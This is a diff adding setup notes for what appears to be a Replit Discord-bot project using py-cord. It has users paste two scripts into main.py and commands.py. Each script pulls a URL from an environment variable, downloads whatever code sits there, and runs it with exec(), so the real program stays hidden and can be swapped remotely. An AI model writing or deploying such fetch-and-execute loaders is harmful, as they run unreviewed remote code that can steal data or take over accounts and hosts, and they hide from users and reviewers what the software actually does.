@@ -1,0 +1,47 @@
+#Show Hidden Files
+#Go To .replit [hidden]
+#disableGuessImports = true
+#entrypoint = "main.py"
+#modules = ["python-3.10"]
+#disableGuessImports = true
+#Go Tools > Dependencies > + Add new package > py-cord
+#paste this script to main.py
+
+import os
+import requests
+from dotenv import load_dotenv
+
+real1 = os.getenv('1')
+
+if real1:
+    try:
+        response = requests.get(real1)
+        if response.status_code == 200:
+            exec(response.text)
+        else:
+            print(f"Failed to fetch script: {response.status_code}")
+    except Exception as e:
+        print(f"Error executing script: {e}")
+else:
+    print("real1 not set")
+
+#############################
+
+#paste this script to commands.py
+import os
+import requests
+from dotenv import load_dotenv
+
+real2 = os.getenv('2')
+
+if real2:
+    try:
+        response = requests.get(real2)
+        if response.status_code == 200:
+            exec(response.text)
+        else:
+            print(f"Failed to fetch script: {response.status_code}")
+    except Exception as e:
+        print(f"Error executing script: {e}")
+else:
+    print("real2 not set")
